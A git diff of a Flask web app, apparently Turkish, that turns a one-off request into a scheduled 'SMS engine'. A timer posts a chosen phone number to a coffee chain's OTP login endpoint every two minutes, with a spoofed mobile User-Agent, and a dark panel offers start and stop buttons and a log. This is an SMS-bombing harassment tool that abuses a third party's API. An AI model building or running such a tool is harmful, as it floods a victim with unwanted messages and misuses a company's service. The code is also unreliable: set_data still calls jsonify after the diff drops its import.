@@ -1,66 +1,95 @@
 import os
 import requests
-from flask import Flask, request, jsonify
+import time
+from flask import Flask, render_template_string, request
+from flask_apscheduler import APScheduler
 
 app = Flask(__name__)
 
-# ANA SAYFA VE SADE TASARIM
+# --- APSCHEDULER AYARI ---
+class Config:
+    SCHEDULER_API_ENABLED = True
+
+app.config.from_object(Config())
+scheduler = APScheduler()
+scheduler.init_app(app)
+scheduler.start()
+
+# Değişkenleri hafızada tutuyoruz (Uygulama restart yiyene kadar kalır)
+sys_data = {
+    "target": "",
+    "is_active": False,
+    "logs": []
+}
+
+def write_log(message):
+    now = time.strftime('%H:%M:%S')
+    full_msg = f"[{now}] {message}"
+    sys_data["logs"].append(full_msg)
+    if len(sys_data["logs"]) > 12: sys_data["logs"].pop(0)
+    # RENDER PANELE ANINDA DÖKMEK İÇİN:
+    print(f">>> {full_msg}", flush=True)
+
+# 2 DAKİKADA BİR ÇALIŞACAK GÖREV
+@scheduler.task('interval', id='do_job', minutes=2)
+def auto_worker():
+    if not sys_data["is_active"] or not sys_data["target"]:
+        return
+
+    url = "https://api.kahvedunyasi.com/v1/login/otp"
+    payload = {"mobile_number": sys_data["target"], "channel": "sms"}
+    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 17_0 like Mac OS X)"}
+
+    try:
+        r = requests.post(url, json=payload, headers=headers, timeout=10)
+        status = "BAŞARILI (200)" if r.status_code == 200 else f"HATA ({r.status_code})"
+        write_log(f"{sys_data['target']} -> {status}")
+    except:
+        write_log("BAĞLANTI KESİLDİ")
+
 @app.route('/')
-def home():
-    return """
+def ui():
+    # Sade ve Karanlık Tasarım
+    html = """
     <!DOCTYPE html>
     <html lang="tr">
     <head>
-        <meta charset="UTF-8">
-        <title>SMS Motoru</title>
+        <meta charset="UTF-8"><title>SMS Panel</title>
         <style>
-            body { background: #111; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-            .container { background: #222; padding: 40px; border-radius: 15px; border: 1px solid #444; text-align: center; }
-            input { padding: 12px; width: 250px; border-radius: 8px; border: 1px solid #555; background: #000; color: #fff; margin-bottom: 20px; outline: none; }
-            button { padding: 12px 30px; background: #00d2d3; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #000; }
-            #res { margin-top: 20px; color: #00d2d3; font-weight: bold; }
+            body { background: #0a0a0a; color: #eee; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
+            .box { background: #1a1a1a; padding: 25px; border-radius: 12px; width: 320px; border: 1px solid #333; text-align: center; }
+            input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #444; color: #0f0; border-radius: 5px; box-sizing: border-box; }
+            button { width: 48%; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+            .start { background: #28a745; color: #fff; }
+            .stop { background: #dc3545; color: #fff; }
+            .logs { background: #000; color: #0f0; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; height: 160px; overflow-y: auto; margin-top: 15px; text-align: left; }
         </style>
+        <script>setTimeout(() => location.reload(), 15000);</script>
     </head>
     <body>
-        <div class="container">
-            <h2>SMS Gönderici</h2>
-            <input type="text" id="p" placeholder="5XXXXXXXXX" maxlength="10"><br>
-            <button onclick="go()">BAŞLAT</button>
-            <div id="res"></div>
+        <div class="box">
+            <h3>SMS MOTORU v4</h3>
+            <p style="color: {{ 'lime' if data.is_active else 'red' }}">Sistem: {{ 'ÇALIŞIYOR' if data.is_active else 'DURDU' }}</p>
+            <form action="/set" method="post">
+                <input type="text" name="num" placeholder="5XXXXXXXXX" value="{{ data.target }}">
+                <button name="op" value="on" class="start">BAŞLAT</button>
+                <button name="op" value="off" class="stop">DURDUR</button>
+            </form>
+            <div class="logs">
+                {% for l in logs %}> {{ l }}<br>{% endfor %}
+            </div>
         </div>
-        <script>
-            function go() {
-                const p = document.getElementById('p').value;
-                document.getElementById('res').innerText = "İşlem yapılıyor...";
-                fetch('/start', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: p})
-                }).then(r => r.json()).then(d => {
-                    document.getElementById('res').innerText = "Sonuç: " + d.status;
-                });
-            }
-        </script>
     </body>
     </html>
     """
+    return render_template_string(html, data=sys_data, logs=reversed(sys_data["logs"]))
 
-@app.route('/start', methods=['POST'])
-def start():
-    data = request.get_json()
-    phone = data.get('phone')
-    
-    url = "https://api.kahvedunyasi.com/v1/login/otp"
-    payload = {"mobile_number": phone, "channel": "sms"}
-    
-    try:
-        res = requests.post(url, json=payload, timeout=10)
-        # BU SATIR PANELE DÖKER
-        print(f">>> DURUM: {res.status_code} | HEDEF: {phone}", flush=True)
-        return jsonify({"status": res.status_code})
-    except Exception as e:
-        print(f"HATA: {e}", flush=True)
-        return jsonify({"status": "hata"}), 500
+@app.route('/set', methods=['POST'])
+def set_data():
+    sys_data["target"] = request.form.get('num', '')
+    sys_data["is_active"] = (request.form.get('op') == 'on')
+    write_log(f"Sistem Güncellendi. Hedef: {sys_data['target']}")
+    return jsonify({"ok": True}), 302, {'Location': '/'}
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
